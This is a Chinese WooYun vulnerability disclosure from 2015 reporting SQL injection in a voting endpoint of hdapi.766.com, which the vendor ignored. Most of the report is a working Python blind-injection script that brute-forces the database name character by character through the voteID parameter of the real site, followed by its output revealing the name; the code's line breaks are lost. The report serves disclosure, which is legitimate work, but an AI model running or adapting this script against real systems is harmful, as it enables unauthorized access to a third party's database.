wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-03-10：	细节已通知厂商并且等待厂商处理中									2015-03-15：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql注入 详细说明：  盲注，报错注入
database is  hdatabase is  hddatabase is  hdadatabase is  hdapdatabase is  hdapidatabase is  hdapi_database is  hdapi_7database is  hdapi_76database is  hdapi_766database is  hdapi_766_database is  hdapi_766_cdatabase is  hdapi_766_codatabase is  hdapi_766_comdatabase is  hdapi_766_com
   漏洞证明：  脚本
import timefrom urllib import *payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')   database = ''for i in range(1,20):    before = database    for payload in payloads:        voteid="173 and ord(mid(database(),%s,1))=%s" % (i,ord(payload))        f = urlopen("http://hdapi.766.com/vote2Port/voteItem?callback=jQuery17203401052904727906_1425695718028&voteID="+voteid+        "&guestKey=f8eb307983de013e21b6828dda5b149d&t=0.03819525865412032&_=1425695718109")        s = f.read()        if s.find('wrong',0,len(s))==-1:               database += payload            print 'database is ', database            time.sleep(0.01)            break    if before == database:        breakprint ''print 'database is ', database
   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-03-15 11:46 厂商回复：  最新状态： 暂无
